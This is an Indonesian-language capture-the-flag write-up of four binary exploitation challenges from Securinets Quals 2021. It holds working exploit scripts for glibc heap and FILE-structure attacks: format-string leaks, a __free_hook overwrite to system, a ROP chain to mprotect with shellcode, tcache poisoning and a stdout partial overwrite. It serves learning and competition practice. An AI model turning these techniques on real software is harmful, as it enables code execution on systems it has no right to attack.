+++
title = "Pwn-ing at Securinets Quals 2021"
date = "2021-03-22 15:57:28 +0700"
tags = ["dark"]
+++

## Overview

Soal-soalnya sangat bagus menurutku (karena solved semua aja sih :evillaught:), tapi aku kerjain ini semalam setelah kompetisi selesai. Karena saat kulihat di runing event ctftime, ternyata waktu <1 jam selesai :’(. Aku hanya kerjain bagian Binary Explotation saja dan dibawah ini writeupnya.

## Kill Shot (810 pts)

Simplenya, binary ini memberikan kita `printf` dengan controlled parameter untuk mendapatkan information leaks, dan fungsi kill yang bisa kita gunakan untuk dapatkan arbitrary write.

### The Seccomp

Binary ini menggunakan `seccomp` untuk filter apa saja `syscall` yang diizinkan untuk kita.

```py
line  CODE  JT   JF      K
=================================
0000: 0x20 0x00 0x00 0x00000004  A = arch
0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
0002: 0x20 0x00 0x00 0x00000000  A = sys_number
0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
0007: 0x15 0x02 0x00 0x00000005  if (A == fstat) goto 0010
0008: 0x15 0x01 0x00 0x0000000a  if (A == mprotect) goto 0010
0009: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0011
0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
0011: 0x06 0x00 0x00 0x00000000  return KILL
```

### Exploit

Information leaks (pie, libc, heap, etc), didapatkan dengan mudah dengan controlled parameter `printf` yang sudah aku tulis diatas.

```py
payload = b'%4$p||%6$p||%25$p||%13$p'
r.sendlineafter(b'Format: ', payload)

leaks = r.recvline(0).split(b'||')
```

Overwrite `__free_hook` ke fungsi `kill` pada saat awal program untuk dapatkan infinite arbitrary write.

```py
r.sendlineafter('Pointer: ', f'{libc.sym.__free_hook}')
r.sendlineafter('Content: ', p64(elf.sym.kill))
```

Arbitrary write ini akan digunakan untuk tulis ropchain ke stack yang akan panggil mprotect untuk membuat heap memory menjadi executable.

Prepare shellcode lalu kalkulasi jarak shellcode diheap dengan leaked heap address tadi yang nantinya ini akan menjadi return address setelah rop dilakukan.

```py
shellcode  = shellcraft.openat(0x0, '/home/ctf/flag.txt', 0x0)
shellcode += shellcraft.read('rax', 'rsp', 0x47)
shellcode += shellcraft.write(0x1, 'rsp', 0x47)

add(0xC8, asm(shellcode))

# pwndbg> dq 0x5555557580f0-0x10
# 00005555557580e0     0000000000000001 00000000000000d1
# 00005555557580f0     2434810101757968 2f66b84801010101
#                                    ^^ our shellcode start here
# 0000555555758100     4850742e67616c66 632f656d6f682fb8
# 0000555555758110     31ff31e689485074 0f0101b866c031d2

# pwndbg> p/x 0x5555557580f0-0x555555757260
# $2 = 0xe90

shellcode_start = heap + 0xE90
```

Write ROP-chain untuk ubah permission heap menjadi executable dan return ke shellcode.

```py
stack_rip = stack - 0xD8

rop = ROP(libc)
rop.call(libc.sym['mprotect'], [heap - 0x260, 0x21000, 0x7])

payload = bytes(rop) + p64(shellcode_start)

for offset in range(0, len(payload), 8):
    kill(stack_rip + offset, payload[offset:offset + 8])
```

Exit untuk trigger ROP dan return ke shellcode. Sekarang heap memory memiliki permission executable dan shellcode akan tereksekusi.

```sh
pwndbg> vmmap heap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x555555757000     0x555555778000 rwxp    21000 0      [heap]
```

### Intended Solution

Intended Solution dari author adalah overwrite `fastbinY` agar menunjuk ke stack. Agar malloc mengembalikan pointer dalam range stack. Malloc ke-N akan me-return alamat stack yang berisi address dari rip. Dan melakukan ROP open-read-write, menggunakan `openat`.

## Death Note (896 pts)

Classic heapnote challenge dengan fungsi create, edit, view, delete seperti pada umumnya.

### Analysist

Create melakukan malloc dengan size dari user dengan constraint, `0 > size < 0x100`. Dengan index array mencari yang kosong dan ditentukan oleh sistem. Data array hanya berukuran 10.

```c
int create()
{
    signed int i, size;
    int result;

    for ( i = 0; ; ++i )
    {
    if ( i > 9 )
        return puts("Enough targets for today!");
    if ( !gdata[i] )
        break;
    }
    write(1, "Provide note size:", 0x12);
    size = read_long();
    if ( size <= 0 || size > 0xFF )
    {
        result = puts("Wrong size!");
    }
    else
    {
        gdata[i] = malloc(size);
        gsize[i] = size;
        result = printf("Note is created at index: %d\n", i);
    }
    return result;
}
```

Edit ini melakukan read array yang sudah diallokasikan oleh user dengan constraint index < 9.

```c
ssize_t edit()
{
    ssize_t result;
    signed int index;

    write(1, "Provide note index: ", 0x14);
    index = read_long();
    if ( index > 9 )
    {
        result = write(1, "The death note isn't that big unfortunately\n", 0x2C);
    }
    else if ( gdata[index] )
    {
        write(1, "Name: ", 6);
        result = read(0, gdata[index], gsize[index]);
    }
    else
    {
        result = write(1, "Page doesn't even exist!\n", 0x19);
    }
    return result;
}
```

Delete akan melakukan free ke index dari user yang sudah diallokasikan. Dan pointer akan di-set menjadi NULL (no uaf). View akan mengoutputkan informasi data dari index yang diberikan.

### Where is the bug?

Bugnya secara jelas ada di edit. Karena contraint hanya index < 9 dengan bilangan negatif ini akan lolos. Ini bisa digunakan untuk edit pointer-pointer yang ada diatas `array_data_notes`.

### Exploit

Untuk mempermudah interaksi dengan soal,

```py
def create(size):
    r.sendlineafter('Exit\n', '1')
    r.sendlineafter(':', f'{size}')

def edit(idx, data):
    r.sendlineafter('Exit\n', '2')
    r.sendlineafter(':', f'{idx}')
    r.sendafter(': ', data)

def delete(idx):
    r.sendlineafter('Exit\n', '3')
    r.sendlineafter(': ', f'{idx}')

def view(idx):
    r.sendlineafter('Exit\n', '4')
    r.sendlineafter(':', f'{idx}')
    return r.recvline(0)
```

Address libc bisa didapatkan dengan memenuhi tcachebins. Free selanjutnya dengan size yang sama akan masuk ke unsortedbins. Chunk ini mempunyai 2 pointer, FD dan BK yang menunjuk ke main_arena yang letaknya di libc.

```py
for _ in range(8):
    create(0x80)

# prevent consolidation with top_chunks
create(0x20)

for i in range(8):
    delete(i)

# tcachebins
# 0x90 [  7]: 0x555555757620 —▸ 0x555555757590 —▸ 0x555555757500 —▸ 0x555555757470 —▸ 0x5555557573e0 —▸ 0x555555757350 —▸ 0x5555557572c0 ◂— 0x0

# unsortedbin
# all: 0x5555557576d0 —▸ 0x155555324ca0 (main_arena+96) ◂— 0x5555557576d0
```

Sekarang, hanya allokasikan chunks size < chunk unsortedbins. Maka akan ada pointer main_arena di chunk data yang baru saja dialokasikan.

```py
create(0x20)

# pwndbg> dq 0x5555557576a0
# 00005555557576a0     0000000000000000 0000000000000031
# 00005555557576b0     0000155555324d20 0000155555324d20 -> chunks[0]'s data
# 00005555557576c0     0000000000000000 0000000000000000

leak = u64(view(0).ljust(8, b'\0')) >> 8
libc.address = leak - 0x3ebd20

delete(0)
```

Kondisi tcachebins, array_data_notes dan chunk diatasnya pada heap sekarang,

```py
0x30 [1]: 0x5555557576b0 ◂— 0x0
0x90 [7]: 0x555555757620 —▸ 0x555555757590 —▸ 0x555555757500 —▸ 0x555555757470 —▸ 0x5555557573e0 —▸ 0x555555757350 —▸ 0x5555557572c0 ◂— 0x0
---
0x555555757000	0x0000000000000000	0x0000000000000251
0x555555757010	0x0700000000000100	0x0000000000000000
...
0x555555757050	0x0000000000000000	0x00005555557576b0
...
0x555555757080	0x0000000000000000	0x0000555555757620
...
0x555555757250	0x0000000000000000	0x0000000000000061
0x555555757260	0x0000000000000000	0x0000000000000000 --> array_data_notes[10]
0x555555757270	0x0000000000000000	0x0000000000000000
0x555555757280	0x0000000000000000	0x0000000000000000
0x555555757290	0x0000000000000000	0x0000000000000000
0x5555557572a0	0x0000555555757740	0x0000000000000000
0x5555557572b0	0x0000000000000000
```

Pada alamat `0x555555757088`, berisi `0x555555757620`, yang mana ini merupakan salah satu FD pointer chunk yang ada di tcachebins diatas.

Karena terdapat index out-of-bound (negative number) pada fungsi edit, kita bisa melakukan tcache-poisoning dengan mengedit alamat tersebut untuk menunjuk ke `__free_hook`. Lalu overwrite `__free_hook` menjadi system.

Trigger dengan melakukan free ke chunk yang menyimpan string /bin/sh untuk mendapatkan RCE.

```py
# pwndbg> p (0x555555757088-0x555555757260)/8
# $2 = -59

edit(-59, p64(libc.sym['__free_hook']))

create(0x80) ; edit(0, b'/bin/sh\0')
create(0x80) ; edit(1, p64(libc.sym['system']))

# pwndbg> tel &__free_hook 1
# 00:0000│   0x1555553268e8 (__free_hook) —▸ 0x155554f884e0 (system) ◂— test   rdi, rdi

delete(0)
```

## Success (957 pts)

Pada dasarnya challange ini berdasarkan File Structure Exploit - GLIBC 2.27. Goal-nya adalah untuk bypass `_IO_vtable_check` yang terdapat pada libc versi 2.24 keatas.

### Infomation Leaks

Didapatkan pada fungsi get_name, karena menggunakan read yang tidak mengakhiri buffernya dengan nullbyte. Dengan ini, bisa membocorkan nilai-nilai yang ada distack.

```py
r.sendafter('Please provide student username: ', 'A' * 0x8)
pie = uu64(r.recvline(0).split()[2][8:]) - 0x1090

r.sendafter('Please provide student username: ', 'A' * 0x10)
libc.address = uu64(r.recvline(0).split()[2][0x10:]) - libc.sym['_IO_file_jumps']
```

Bug nya ada di fungsi fill_data. Out-of-bound di .bss, karena array datas hanya berukuran 64, tetapi input number bisa sampai 64, ini akan meng-overwrite file pointer numbers2.

```c
number = get_int(1LL, "Provide number of subjects: ");
if ( number > 64 || number < 0 )
    exit(0);
for ( i = 0; i <= number; ++i )
{
    get_float(1LL, &s);
    datas[i] = _mm_cvtsi128_si32(a1);
}

/**
 * .bss:0000000000202060 ; _DWORD datas[64]
 * .bss:0000000000202160 ; FILE *numbers2
 **/
```

### Crafting Fake File Structure

Bisa dengan mudah karena pwntools sudah menyediakan :smile:

```py
rdi = libc.search(b'/bin/sh').__next__()
fake_vtable = (libc.sym['_IO_file_jumps'] + 0xd8) - 2 * 8

fake_struct = FileStructure()
fake_struct._IO_buf_base   = 0
fake_struct._IO_buf_end    = (rdi - 100) // 2
fake_struct._IO_write_ptr  = (rdi - 100) // 2
fake_struct._IO_write_base = 0
fake_struct._lock          = pie + elf.sym['ch'] + 0x80
fake_struct.vtable         = fake_vtable
```

Karena terdapat space array datas\[64\], ini merupakan target yang bagus untuk menaruh fake_file_struct yang dibuat. Tantangannya adalah menulis dalam bentuk float. Berikut helper untuk konversi ke float,

```py
def toFloat(value):
    return struct.unpack("<f", p32(value))[0]
```

### Exploit

Writing time, wwww.

```py
payload = bytes(fake_struct) + p64(libc.sym['system'])

for i in range(0, len(payload), 8):
    target = u64(payload[i:i+8])
    r.sendlineafter(': ', f'{toFloat(target & 0xFFFFFFFF)}')
    r.sendlineafter(': ', f'{toFloat(target >> 32)}')

# padding
for _ in range(6):
    r.sendlineafter(': ', f'{toFloat(0)}')

# overwrite file_stream_ptr numbers2 to our fake_file_struct.
r.sendlineafter(': ', f'{toFloat((pie + elf.sym.ch) & 0xFFFFFFFF)}')
```

Fungsi `fclose` akan men-trigger fake_file_struct kita dan RCE didapatkan.

## Membership Management (988 pts)

Heap exploitation challange GLIBC 2.31. Dengan fitur create, delete, edit dan tanpa view. Yaa, inti tantangan problem ini adalah tidak ada fungsi view, yang dapat mempermudah untuk mendapat leak.

### Analysist

Subscribe, akan melakukan malloc sebesar 0x50. Pointer heap dari malloc ini ditampung di variable global array yang memiliki size 52. Dan melakukan inisiasi is_active pada index array yang dipakai menjadi 1. Ini menandakan chunk dalam kondisi terpakai.

```c
int __usercall subscribe()
{
    int result;
    signed int i;

    __asm { rep nop edx }
    for ( i = 0; i <= 49; ++i )
    {
        if ( !is_active[i] )
        {
            gdata[i] = malloc(0x50);
            is_active[i] = 1;
            puts("Done");
            result = i;
            return result;
        }
    }
    return puts("No more free slots!");
}
```

Unsubscribe, akan melakukan free terhadap suatu index array, dan mengeset is_active pada index ini menjadi 0.

```c
int __usercall unsubscribe()
{
    int result;
    int index;

    printf("Index: ");
    index = read_long();
    if ( index < 0 || index > 50 )
    {
        result = puts("There is no such member");
    }
    else
    {
        result = is_active[index];
        if ( result )
        {
            free(gdata[index]);
            puts("Done");
            result = index;
            is_active[index] = 0;
        }
    }
    return result;
}
```

Modify, melakukan read terhadap content member dengan constraint `0 >= index <= 50` yang mana index adalah pilihan dari user.

```c
int __usercall modify()
{
    int result; // eax@3
    int index; // [sp-Ch] [bp-Ch]@1

    printf("Index: ");
    index = read_long(&v3);
    if ( index < 0 || index > 50 )
    {
        result = puts("There is no such member");
    }
    else
    {
        printf("Content: ");
        result = read(0, gdata[index], 0x32uLL);
    }
    return result;
}
```

### Bug

Ada di fungsi unsubscribe, karena global data array pada index yang telah di-free tidak di-NULL kan. Sehingga, menimbulkan bug use-after-free. Dengan ini kita bisa mengedit chunk yang telah di free sehingga `FD` dan `BK` pointer chunk yang telah di free dapat kita kontrol untuk menunjuk kemanapun.

### Information Leaks

Tantangannya adalah tidak ada fitur view. Leak bisa didapatkan dengan melakukan partial overwrite ke `_IO_2_1_stdout_`. Cara ini membutuhkan bruteforce 1 byte dengan kemungkinan 1/16. Hal yang harus dilakukan adalah meng-corrupt `tcachebins` agar menunjuk ke `_IO_2_1_stdout_`.

### Exploit

Helper,

```py
def subscribe():
    r.sendlineafter('>', '1')

def unsubscribe(idx):
    r.sendlineafter('>', '2')
    r.sendlineafter(': ', f'{idx}')

def modify(idx, data):
    r.sendlineafter('>', '3')
    r.sendlineafter(': ', f'{idx}')
    r.sendafter(': ', data)
```

Karena subcsribe hanya melakukan `malloc` sebesar 0x50, kita perlu chunk yang besar agar jika di free, akan masuk ke `unsortedbins` sehingga, `FD` dan `BK` pointer menunjuk ke `main_arena` untuk melakukan partial overwrite.

Dengan use-after-free, edit `FD` pointer dari chunk yang sudah di-free agar menunjuk ke `chunk_size` dari suatu chunk yang berdekatan.

```py
for _ in range(3):
    subscribe()

unsubscribe(0)
unsubscribe(2)

# tcachebins
# 0x60 [  2]: 0x555555559360 —▸ 0x5555555592a0 ◂— 0x0
```

kondisi ketiga chunks,

```py
0x555555559290:   0x0000000000000000  0x0000000000000061 <- heap_struct of chunks[0] (free`d)
0x5555555592a0:   0x0000000000000000  0x0000555555559010 <- tcachebins[0x60][1/2]
0x5555555592b0:   0x0000000000000000  0x0000000000000000
0x5555555592c0:   0x0000000000000000  0x0000000000000000
0x5555555592d0:   0x0000000000000000  0x0000000000000000
0x5555555592e0:   0x0000000000000000  0x0000000000000000
0x5555555592f0:   0x0000000000000000  0x0000000000000061 <- heap_struct of chunks[1]
0x555555559300:   0x0000000000000000  0x0000000000000000
0x555555559310:   0x0000000000000000  0x0000000000000000
0x555555559320:   0x0000000000000000  0x0000000000000000
0x555555559330:   0x0000000000000000  0x0000000000000000
0x555555559340:   0x0000000000000000  0x0000000000000000
0x555555559350:   0x0000000000000000  0x0000000000000061 <- heap_struct of chunks[2] (free`d)
0x555555559360:   0x00005555555592a0  0x0000555555559010 <- tcachebins[0x60][0/2]
0x555555559370:   0x0000000000000000  0x0000000000000000
0x555555559380:   0x0000000000000000  0x0000000000000000
0x555555559390:   0x0000000000000000  0x0000000000000000
0x5555555593a0:   0x0000000000000000  0x0000000000000000
0x5555555593b0:   0x0000000000000000  0x0000000000020c91 <- top_chunk
```

Terlihat bahwa size dari `chunks[1]` yang terdapat pada alamat `0x5555555592f0`, ini hanya berbeda 1 byte LSB dengan `FD` dari `chunks[2]` pada `0x5555555592a0`. Yang diperlukan adalah edit LSB `FD` pointer `chunks[2]` ini ke `0xf8` agar mengarah ke size dari `chunks[1]`.

```py
modify(2, b'\xf8')

# tcachebins
# 0x60 [  2]: 0x555555559360 —▸ 0x5555555592f8 ◂— 0x61 /* 'a' */
```

Sekarang siapkan chunks padding untuk chunk dengan size yang besar nanti,

```py
subscribe() # idx: 0
subscribe() # idx: 2 -> contains chunks[1]'s size

# prepare chunks data for big size chunk (in this case: 0x420)
for _ in range(9):
    subscribe()

# prevent consolidation with top_chunk
subscribe()
```

Edit size dari `chunks[1]` tadi menjadi `0x421` dan lakukan `free`, agar masuk ke `unsortedbins`.

```py
modify(2, p64(0x421))

unsubscribe(1)

# unsortedbin
# all: 0x5555555592f0 —▸ 0x7ffff7fbabe0 (main_arena+96) ◂— 0x5555555592f0
```

Sekarang siapkan chunks yang berdekatan, untuk men-corrupt tcachebins agar menunjuk ke `_IO_2_1_stdout_`.

```py
for _ in range(5):
    subscribe()

# 2 bytes lsb of `\_IO_2_1_stdout_`
modify(16, p16(0xb6a0))

# pwndbg> dq 0x555555559480-0x10
# 0000555555559470     0000000000000000 0000000000000061
# 0000555555559480     00007ffff7fbb6a0 00007ffff7fbabe0
#                                    ^^ our chunk target
# 0000555555559490     0000000000000000 0000000000000000
# 00005555555594a0     0000000000000000 0000000000000000
```

Aku memilih `chunks[16]` menjadi target untuk `_IO_2_1_stdout_`. Siapkan free\`d chunks yang berdekatan, agar chunks target dan salah `FD` pointer yang ada di `tcachabins` hanya berbeda 1 byte saja di LSB-nya, sehingga bisa kita overwrite agar menunjuk ke target.

```py
unsubscribe(14)
unsubscribe(15)
unsubscribe(1)

# tcachebins
# 0x60 [  3]: 0x555555559300 —▸ 0x555555559420 —▸ 0x5555555593c0 ◂— 0x61 /* 'a' */
```

`FD` Pointer dari `chunks[1]` yang menunjuk ke `0x555555559420` hanya berbeda 1 byte LSB-nya saja dengan chunk target kita yang berada di `0x555555559480`. Dengan mengubah 1 byte LSB dari `chunks[1]` menjadi `0x80`, tcachebins akan menunjuk ke chunk target kita.

```py
modify(1, b'\x80')

# tcachebins
# 0x60 [  3]: 0x555555559300 —▸ 0x555555559480 —▸ 0x7ffff7fbb6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
```

NOTE: Saya mematikan ASLR untuk mempermudah melakukan debugging.

Sekarang, overwrite file*struct `\_IO_2_1_stdout*`agar mencetak suatu alamat libc. Dengan mengoverwite 1 byte LSB dari`\_IO_write_base` ke suatu address yang menyimpan address libc.

```py
for _ in range(3):
    subscribe()

fake_struct = p64(0xfbad1800) + p64(0) + p64(0) + p64(0) + p8(0x8)
modify(15, fake_struct)
```

Ketika `_IO_2_1_stdout_` berhasil dioverwrite, maka program akan mengoutputkan suatu memory yang ditunjuk oleh `_IO_write_base` dan bisa dikalkulasi untuk mendapat libc leak.

![IMAGE leak](/assets/securinets-pwn/leak.png)

Karena leak sudah didapat, tinggal tcache-poisoning seperti biasa. Overwrite `__free_hook` menjadi system. Free chunk yang menyimpan string /bin/sh untuk dapat RCE !

```py
unsubscribe(11)
unsubscribe(12)

modify(12, p64(libc.sym['__free_hook']))

# tcachebins
# 0x60 [  2]: 0x555555559720 —▸ 0x7ffff7fbdb28 (__free_hook) ◂— 0x0

subscribe()
subscribe()

modify(12, p64(libc.sym['system']))

# pwndbg> tel &__free_hook 1
# 00:0000│   0x7ffff7fbdb28 (__free_hook) —▸ 0x7ffff7e24410 (system) ◂— endbr64

modify(13, b'/bin/sh\0')
unsubscribe(13)
```

Tambahkan try except untuk otomasi bruteforce.

![IMAGE test](/assets/securinets-pwn/test.png)

Nice challanges!

## Reference

- [http://blog.rh0gue.com/2017-12-31-34c3ctf-300/](http://blog.rh0gue.com/2017-12-31-34c3ctf-300/)
- [https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/](https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/)
- [https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique](https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique)
- [https://znqt.github.io/hitcon2018-babytcache/](https://znqt.github.io/hitcon2018-babytcache/)
